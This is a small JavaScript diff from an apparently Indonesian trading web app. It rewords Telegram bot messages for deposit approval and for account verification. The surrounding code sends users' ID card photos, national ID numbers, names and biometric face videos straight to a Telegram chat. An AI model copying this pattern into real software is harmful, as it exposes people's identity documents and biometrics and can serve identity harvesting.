@@ -2359,7 +2359,7 @@
             tradeHistory.unshift({ id: trxId, type: 'Deposit', amount: amount, time: timeStr, status: 'Menunggu', info: 'QRIS Pembayaran' });
             saveDataLocally(); renderHistory();
 
-            sendToTelegram(`*PERMINTAAN ISI SALDO*\nUID: \`${userID}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\n\nKirim QRIS: \`/send ${userID}\` \nKonfirmasi saldo: \`/acc ${amount} ${userID}\` \nTolak isi saldo: \`/tolak ${userID}\``);
+            sendToTelegram(`*PERMINTAAN ISI SALDO*\nUID: \`${userID}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\n\nKirim QRIS: \`/send ${userID}\` \nKonfirmasi: \`/acc ${amount} ${userID}\` \nTolak: \`/tolak ${userID}\``);
         }
 
         function showQR(url, activeDep, isResume = false) {
@@ -2939,7 +2939,7 @@
             updateAuthUI();
             showModal("Berhasil", "Sedang dalam proses verifikasi.", "win");
             
-            let captionKtp = `*BERKAS VERIFIKASI AKUN*\nUID Profil: \`${userID}\`\nNama KTP: ${nama}\nNomor NIK: \`${nik}\`\n\nKonfirmasi: \`/verif ${userID}\` \nTolak Dokumen: \`/tolak_verif ${userID}\``;
+            let captionKtp = `*BERKAS VERIFIKASI AKUN*\nUID Profil: \`${userID}\`\nNama KTP: ${nama}\nNomor NIK: \`${nik}\`\n\nKonfirmasi: \`/verif ${userID}\` \nTolak: \`/tolak_verif ${userID}\``;
             
             await sendPhotoToTelegram(ktpFile, captionKtp);
             await sendVideoToTelegram(faceBlob, `*VIDEO BIOMETRIK LIVENESS (KTP)*\n\`${userID}\``);
